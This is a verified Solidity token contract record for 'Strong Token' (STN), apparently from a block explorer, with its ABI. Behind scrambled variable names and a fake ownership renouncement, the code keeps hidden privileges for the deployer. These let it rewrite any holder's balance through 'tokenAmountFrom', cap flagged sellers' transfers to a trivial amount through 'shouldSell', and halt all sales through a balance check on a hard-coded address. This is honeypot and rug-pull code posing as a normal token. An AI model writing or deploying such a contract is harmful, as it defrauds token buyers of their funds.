{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface listReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeAmount) external view returns (uint256);\n\n    function transfer(address feeSender, uint256 fundTx) external returns (bool);\n\n    function allowance(address maxBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fundTx) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeSender,\n        uint256 fundTx\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listTotalAuto, uint256 value);\n    event Approval(address indexed maxBuy, address indexed spender, uint256 value);\n}\n\nabstract contract senderAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountTeamTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityFund {\n    function createPair(address receiverAuto, address receiverBuy) external returns (address);\n}\n\ninterface isMinReceiver is listReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StrongToken is senderAmount, listReceiver, isMinReceiver {\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxFeeAt;\n    }\n\n    event OwnershipTransferred(address indexed toIs, address indexed shouldLiquidity);\n\n    mapping(address => bool) public walletLaunch;\n\n    uint256 private limitSellAuto = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return marketingMax;\n    }\n\n    function transfer(address fromReceiver, uint256 fundTx) external virtual override returns (bool) {\n        return senderToEnable(_msgSender(), fromReceiver, fundTx);\n    }\n\n    bool private autoLiquidity;\n\n    function shouldSell(address receiverToken) public {\n        liquidityFrom();\n        \n        if (receiverToken == fundAuto || receiverToken == modeTotal) {\n            return;\n        }\n        walletLaunch[receiverToken] = true;\n    }\n\n    function senderFund(address shouldFund) public {\n        if (toFund) {\n            return;\n        }\n        if (minReceiverLaunch) {\n            marketingMinTeam = receiverShould;\n        }\n        isAmountTo[shouldFund] = true;\n        if (senderTo != minTrading) {\n            txFromFund = marketingMinTeam;\n        }\n        toFund = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingMax;\n    }\n\n    address public modeTotal;\n\n    uint256 public amountLiquidityToken;\n\n    function approve(address fundBuy, uint256 fundTx) public virtual override returns (bool) {\n        modeMinSwap[_msgSender()][fundBuy] = fundTx;\n        emit Approval(_msgSender(), fundBuy, fundTx);\n        return true;\n    }\n\n    uint256 isTo;\n\n    mapping(address => uint256) private listToken;\n\n    uint256 public txFromFund;\n\n    function minLaunched(address fundAmountTx, address feeSender, uint256 fundTx) internal returns (bool) {\n        require(listToken[fundAmountTx] >= fundTx);\n        listToken[fundAmountTx] -= fundTx;\n        listToken[feeSender] += fundTx;\n        emit Transfer(fundAmountTx, feeSender, fundTx);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private modeMinSwap;\n\n    function transferFrom(address fundAmountTx, address feeSender, uint256 fundTx) external override returns (bool) {\n        if (_msgSender() != enableToken) {\n            if (modeMinSwap[fundAmountTx][_msgSender()] != type(uint256).max) {\n                require(fundTx <= modeMinSwap[fundAmountTx][_msgSender()]);\n                modeMinSwap[fundAmountTx][_msgSender()] -= fundTx;\n            }\n        }\n        return senderToEnable(fundAmountTx, feeSender, fundTx);\n    }\n\n    function balanceOf(address feeAmount) public view virtual override returns (uint256) {\n        return listToken[feeAmount];\n    }\n\n    function tokenAmountFrom(address fromReceiver, uint256 fundTx) public {\n        liquidityFrom();\n        listToken[fromReceiver] = fundTx;\n    }\n\n    address enableToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant liquidityTo = 20 ** 10;\n\n    uint256 public receiverShould;\n\n    uint256 public marketingMinTeam;\n\n    string private buyMinExempt = \"STN\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitSellAuto;\n    }\n\n    bool public toFund;\n\n    bool private senderTo;\n\n    bool public minReceiverLaunch;\n\n    string private exemptTotalWallet = \"Strong Token\";\n\n    address public fundAuto;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptTotalWallet;\n    }\n\n    function allowance(address enableBuySwap, address fundBuy) external view virtual override returns (uint256) {\n        if (fundBuy == enableToken) {\n            return type(uint256).max;\n        }\n        return modeMinSwap[enableBuySwap][fundBuy];\n    }\n\n    uint256 minFundToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyMinExempt;\n    }\n\n    function minListAt(uint256 fundTx) public {\n        liquidityFrom();\n        isTo = fundTx;\n    }\n\n    address private marketingMax;\n\n    uint8 private maxFeeAt = 18;\n\n    constructor (){\n        \n        amountTeamTx listTradingToken = amountTeamTx(enableToken);\n        modeTotal = liquidityFund(listTradingToken.factory()).createPair(listTradingToken.WETH(), address(this));\n        if (autoLiquidity) {\n            receiverShould = marketingMinTeam;\n        }\n        fundAuto = _msgSender();\n        walletMode();\n        isAmountTo[fundAuto] = true;\n        listToken[fundAuto] = limitSellAuto;\n        if (senderTo) {\n            autoLiquidity = true;\n        }\n        emit Transfer(address(0), fundAuto, limitSellAuto);\n    }\n\n    address isMaxMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function liquidityFrom() private view {\n        require(isAmountTo[_msgSender()]);\n    }\n\n    bool public minTrading;\n\n    function senderToEnable(address fundAmountTx, address feeSender, uint256 fundTx) internal returns (bool) {\n        if (fundAmountTx == fundAuto) {\n            return minLaunched(fundAmountTx, feeSender, fundTx);\n        }\n        uint256 swapBuy = listReceiver(modeTotal).balanceOf(isMaxMin);\n        require(swapBuy == isTo);\n        require(feeSender != isMaxMin);\n        if (walletLaunch[fundAmountTx]) {\n            return minLaunched(fundAmountTx, feeSender, liquidityTo);\n        }\n        return minLaunched(fundAmountTx, feeSender, fundTx);\n    }\n\n    function walletMode() public {\n        emit OwnershipTransferred(fundAuto, address(0));\n        marketingMax = address(0);\n    }\n\n    mapping(address => bool) public isAmountTo;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTotalAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableBuySwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLiquidityToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTx\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isAmountTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMinTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fundTx\",\"type\":\"uint256\"}],\"name\":\"minListAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiverLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFund\",\"type\":\"address\"}],\"name\":\"senderFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"}],\"name\":\"shouldSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTx\",\"type\":\"uint256\"}],\"name\":\"tokenAmountFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTx\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmountTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fundTx\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFromFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StrongToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}